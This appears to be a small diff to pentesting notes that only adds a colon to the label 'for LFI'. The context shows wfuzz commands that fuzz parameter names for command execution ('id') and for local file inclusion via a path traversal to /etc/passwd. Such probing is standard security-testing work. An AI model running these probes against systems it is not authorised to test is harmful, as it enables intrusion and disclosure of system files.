@@ -18,7 +18,7 @@ FOR CMD EXECUTION
 ```bash
 wfuzz -c -z file,"/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" --hw 0 $TARGET_URL/$FILE?FUZZ=id
 ```
-for LFI
+for LFI:
 ```bash
 wfuzz -c -z file,"/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" --hw 0 $TARGET_URL/$FILE?FUZZ=../../../../../../etc/passwd
 ```
